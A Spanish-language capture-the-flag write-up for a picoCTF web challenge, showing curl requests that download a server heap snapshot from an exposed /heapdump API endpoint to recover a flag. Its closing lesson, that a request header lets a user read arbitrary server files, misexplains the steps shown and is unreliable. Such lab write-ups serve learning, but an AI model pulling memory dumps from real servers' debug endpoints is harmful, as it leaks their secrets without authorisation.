# head-dump

## Enunciado

Welcome to the challenge! In this challenge, you will explore a web application and find an endpoint that exposes a file containing a hidden flag.

The application is a simple blog website where you can read articles about various topics, including an article about API Documentation. Your goal is to explore the application and find the endpoint that generates files holding the server’s memory, where a secret flag is hidden.

## Resumen

Lo primero que veo es una web basica de noticias de picoctf

![[head-dump-01.png]]

## Solución

### Verificar la documentación de la api

La documentación de la api esta expuesta en la siguiente publcación:

![[head-dump-02.png]]

### Revisar la documentación de la api

El nombre del CTF es heapdmp asi que reviso esa ruta de la api:

```bash
curl -X 'GET' \
  'http://xebec.cylabacademy.net:22258/heapdump' \
  -H 'accept: */*'
```

con respuesta:

```
accept-ranges: bytes cache-control: public,max-age=0  connection: keep-alive  content-disposition: attachment; filename="heapdump-1794260559488.heapsnapshot"  content-length: 11992200  content-type: application/octet-stream  date: Mon,09 Nov 2026 21:42:40 GMT  etag: W/"b6fc88-1a1c2436871"  keep-alive: timeout=5  last-modified: Mon,09 Nov 2026 21:42:39 GMT x-powered-by: Express
```

### Extraer la flag

Modifico el comando para que lleve en el header el nombre del archivo que quiero leer `flag` y me lo guardo en un archivo llamado `flag.txt`

```
curl -X 'GET' \                                                                               at 22:47:32  
  'http://xebec.cylabacademy.net:22258/heapdump' \
  -H 'content-disposition: filename="flag' > flag.txt
```

Dentro de `flag.txt` se puede ver en texto claro la flag del reto

![[head-dump-03.png]]

## Lo aprendido

- Un comentario te puede llevar a una ruta con información "sensible".
- La documentación de las apis es importante leerla si es accesible por el usuario.
- Un header en una petición obtenida de una API sin sanitizar puede darte acceso a archivos dentro de la máquina / servidor.